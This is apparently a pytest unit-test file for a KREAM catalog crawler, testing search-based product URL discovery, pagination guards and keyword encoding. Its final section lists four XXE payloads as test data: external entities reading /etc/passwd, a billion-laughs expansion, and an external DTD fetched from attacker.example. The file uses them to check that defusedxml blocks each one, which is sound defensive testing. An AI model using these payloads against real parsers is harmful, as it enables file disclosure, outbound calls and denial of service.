"""상품 URL 발견 단위 테스트 — search endpoint 기반 + 페이지네이션."""

from __future__ import annotations

import re
from urllib.parse import quote

import pytest
import requests_mock

from catalog_crawler.http_client import KreamClient
from catalog_crawler.sitemap import (
    KREAM_BASE,
    discover_boots_product_urls_via_search,
    discover_uniform_product_urls,
    fetch_sitemap_index,
)

# 검색 URL regex — query string 의 page 파라미터 무관 매칭.
# 페이지네이션 도입으로 호출 URL 이 `?page=1`, `?page=2` ... 가변이라 정확 URL 매칭 어려움.
_SEARCH_URL_RE = re.compile(re.escape(f"{KREAM_BASE}/search?") + r".*tab=products")


def test_discover_via_search_extracts_unique_product_ids():
    html = """
    <html><body>
      <a href="/products/100">A</a>
      <a href="/products/200">B</a>
      <a href="/products/100">A duplicate</a>
      <a href="/products/300">C</a>
    </body></html>
    """
    client = KreamClient()
    with requests_mock.Mocker() as m:
        # page=1 응답 (3건). page=2 도 같은 응답 → new_count=0 → 페이지네이션 종료.
        m.get(_SEARCH_URL_RE, text=html)
        urls = discover_boots_product_urls_via_search(client, limit=10)

    assert urls == [
        f"{KREAM_BASE}/products/100",
        f"{KREAM_BASE}/products/200",
        f"{KREAM_BASE}/products/300",
    ]


def test_discover_via_search_respects_limit():
    html = "".join(f'<a href="/products/{i}">x</a>' for i in range(100, 200))
    client = KreamClient()
    with requests_mock.Mocker() as m:
        m.get(_SEARCH_URL_RE, text=html)
        urls = discover_boots_product_urls_via_search(client, limit=5)

    assert len(urls) == 5
    assert urls[0] == f"{KREAM_BASE}/products/100"


def test_discover_via_search_custom_keyword():
    client = KreamClient()
    with requests_mock.Mocker() as m:
        m.get(_SEARCH_URL_RE, text='<a href="/products/999">x</a>')
        urls = discover_boots_product_urls_via_search(client, limit=1, keyword="유니폼")

    assert urls == [f"{KREAM_BASE}/products/999"]


# ===== 페이지네이션 회귀 가드 =====


def test_pagination_fetches_multiple_pages_to_reach_limit():
    """page=1 (50건) → page=2 (50건) 순회로 limit 80 도달."""
    client = KreamClient(rate_limit_per_sec=1000)   # rate-limit 무시 (test 속도)

    def _response(request, context):
        # page 파라미터 별 다른 결과 — 페이지네이션 동작 검증.
        page = request.qs.get("page", ["1"])[0]
        if page == "1":
            return "".join(f'<a href="/products/{i}">x</a>' for i in range(1, 51))      # 1~50
        if page == "2":
            return "".join(f'<a href="/products/{i}">x</a>' for i in range(51, 101))    # 51~100
        return ""   # 그 이상은 빈 응답 → 종료

    with requests_mock.Mocker() as m:
        m.get(_SEARCH_URL_RE, text=_response)
        urls = discover_boots_product_urls_via_search(client, limit=80)

    assert len(urls) == 80
    assert urls[0] == f"{KREAM_BASE}/products/1"
    assert urls[79] == f"{KREAM_BASE}/products/80"   # page=2 의 30번째 = id 80


def test_pagination_stops_when_no_new_products():
    """page=1 의 응답이 page=2 와 100% 동일 → new_count=0 → 즉시 종료."""
    client = KreamClient(rate_limit_per_sec=1000)
    html = "".join(f'<a href="/products/{i}">x</a>' for i in range(1, 51))   # 항상 같은 50건

    with requests_mock.Mocker() as m:
        m.get(_SEARCH_URL_RE, text=html)
        urls = discover_boots_product_urls_via_search(client, limit=200)

    # 모든 페이지가 같은 50건 → page=1 결과만 반환 (page=2 가 new=0 으로 break).
    assert len(urls) == 50


def test_pagination_respects_max_pages_safety_guard():
    """_MAX_PAGES=20 가드 — 매 페이지에 새 ID 1건씩만 줘도 무한 fetch 방지."""
    client = KreamClient(rate_limit_per_sec=1000)

    counter = {"page": 0}

    def _response(request, context):
        counter["page"] += 1
        return f'<a href="/products/{counter["page"]}">x</a>'   # 매 페이지 1건 신규

    with requests_mock.Mocker() as m:
        m.get(_SEARCH_URL_RE, text=_response)
        urls = discover_boots_product_urls_via_search(client, limit=10_000)

    # _MAX_PAGES=20 가드 도달 → 최대 20건만 추출 (limit 10_000 미달).
    from catalog_crawler.sources.kream import _MAX_PAGES
    assert _MAX_PAGES == 20
    assert len(urls) == _MAX_PAGES


# ===== ADR-017 — discover_uniform_product_urls 회귀 보호 =====


def test_discover_uniform_default_keyword_quotes_space():
    """ADR-017 §D2: default keyword '축구 유니폼' 의 공백이 quote 인코딩된다."""
    client = KreamClient()
    encoded = quote("축구 유니폼", safe="")
    expected_url = f"{KREAM_BASE}/search?keyword={encoded}&tab=products"
    with requests_mock.Mocker() as m:
        m.get(expected_url, text='<a href="/products/777">jersey</a>')
        urls = discover_uniform_product_urls(client, limit=10)

    assert urls == [f"{KREAM_BASE}/products/777"]


def test_discover_uniform_respects_limit():
    """uniform 흐름도 limit 동작 보장 — 100건 후보 중 limit=3 만 반환."""
    html = "".join(f'<a href="/products/{i}">x</a>' for i in range(500, 600))
    client = KreamClient()
    encoded = quote("축구 유니폼", safe="")
    with requests_mock.Mocker() as m:
        m.get(
            f"{KREAM_BASE}/search?keyword={encoded}&tab=products",
            text=html,
        )
        urls = discover_uniform_product_urls(client, limit=3)

    assert len(urls) == 3
    assert urls[0] == f"{KREAM_BASE}/products/500"


def test_discover_uniform_custom_keyword_overrides_default():
    """keyword 인자로 default ('축구 유니폼') 을 override 가능."""
    client = KreamClient()
    encoded = quote("저지", safe="")
    with requests_mock.Mocker() as m:
        m.get(
            f"{KREAM_BASE}/search?keyword={encoded}&tab=products",
            text='<a href="/products/888">x</a>',
        )
        urls = discover_uniform_product_urls(client, limit=1, keyword="저지")

    assert urls == [f"{KREAM_BASE}/products/888"]


# ===== PR-B: defusedxml XXE 보호 회귀 =====


# PR-B (code-reviewer Major #2 + test-writer M1): defusedxml 이 외부 XML attack vector 를
# 차단한다. stdlib xml.etree 는 모든 vector 에 취약 — 4종 vector parametrize 로 회귀 보호.
_XXE_VECTORS = [
    pytest.param(
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
        '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
        '  <sitemap><loc>&xxe;</loc></sitemap>\n'
        '</sitemapindex>',
        id="external_entity",
    ),
    pytest.param(
        # billion laughs — 재귀 entity expansion (DoS)
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE foo [\n'
        '  <!ENTITY a "lol">\n'
        '  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">\n'
        '  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">\n'
        ']>\n'
        '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
        '  <sitemap><loc>&c;</loc></sitemap>\n'
        '</sitemapindex>',
        id="billion_laughs",
    ),
    pytest.param(
        # external DTD 참조 (네트워크 호출 유도)
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE foo SYSTEM "http://attacker.example/evil.dtd">\n'
        '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
        '  <sitemap><loc>http://example/</loc></sitemap>\n'
        '</sitemapindex>',
        id="external_dtd",
    ),
    pytest.param(
        # parameter entity — DTD 안에서 entity 정의 자체에 외부 참조
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE foo [\n'
        '  <!ENTITY % pe SYSTEM "file:///etc/passwd">\n'
        '  %pe;\n'
        ']>\n'
        '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
        '</sitemapindex>',
        id="parameter_entity",
    ),
]


@pytest.mark.parametrize("payload", _XXE_VECTORS)
def test_fetch_sitemap_index_rejects_xxe_attack_vectors(payload):
    """defusedxml 이 4종 XML attack vector 를 모두 차단한다.

    각 vector 가 raise 하는 exception 의 정확한 클래스명은 defusedxml 버전 의존 —
    module 또는 클래스 이름으로 검증.
    """
    client = KreamClient()
    with requests_mock.Mocker() as m:
        m.get(f"{KREAM_BASE}/sitemap.xml", text=payload)
        with pytest.raises(Exception) as exc_info:
            fetch_sitemap_index(client)

        exc_module = type(exc_info.value).__module__
        exc_name = type(exc_info.value).__name__
        assert "defusedxml" in exc_module or "Forbidden" in exc_name, (
            f"defusedxml 차단 실패 — exc={exc_module}.{exc_name}"
        )
